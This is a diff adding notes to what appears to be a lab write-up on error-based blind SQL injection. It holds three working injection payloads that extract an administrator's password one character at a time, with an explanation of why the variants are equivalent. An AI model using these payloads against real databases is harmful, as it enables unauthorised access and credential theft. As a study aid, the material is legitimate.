@@ -68,6 +68,28 @@ _Note_:
 - For Oracle `SUBSTR()` is used instead of `SUBSTRING()`
 - Using `ASCII()` allows for numeric comparisons (for $x$), avoiding the need to escape characters in payload ($char \in [` `, `~`).
 
+_Payload Note_:
+In this payload:
+
+```sql
+' || (SELECT CASE WHEN (SELECT ASCII(SUBSTRING(password, position, 1)) > X FROM users WHERE username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual|| '
+```
+
+- `TO_CHAR` is not required in this context.
+- Equivalent statement:
+
+```sql
+' || (SELECT CASE WHEN (ASCII(SUBSTRING(password, position, 1)) > X) THEN 1/0 ELSE 'a' FROM users WHERE username='administrator') || '
+```
+
+- This is equivalent to:
+
+```sql
+' || (SELECT 1/0 FROM users WHERE username='administrator' AND (ASCII(SUBSTRING(password, position, 1))) > X) || '
+```
+
+This is because if the `WHERE` clause matches only then `SELECT` expression is evaluated.
+
 ### 🛠️ Exploit Implementation
 
 The automation script (`lab-10.py`) utilizes a modular Object-Oriented design across 6 phases:
